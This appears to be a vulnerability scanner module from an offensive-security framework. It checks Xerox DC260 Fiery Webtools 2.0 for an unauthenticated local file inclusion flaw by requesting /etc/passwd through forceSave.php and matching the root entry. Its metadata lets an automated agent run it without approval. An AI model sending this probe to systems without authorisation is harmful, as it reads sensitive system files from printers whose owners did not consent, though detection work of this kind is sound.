#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Xerox DC260 EFI Fiery Controller Webtools 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion Detection',
        'description': "Xerox DC260 EFI Fiery Controller Webtools 2.0 is vulnerable to local file inclusion because input passed thru the 'file' GET parameter in 'forceSave.php' script is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'iot', 'xerox', 'disclosure', 'lfi', 'packetstorm', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5447.php',
            'https://packetstormsecurity.com/files/145570',
            'https://www.exploit-db.com/exploits/43398/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wt3/forceSave.php?file=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion detected",
                path='/wt3/forceSave.php?file=/etc/passwd',
            )
            return True
        return False

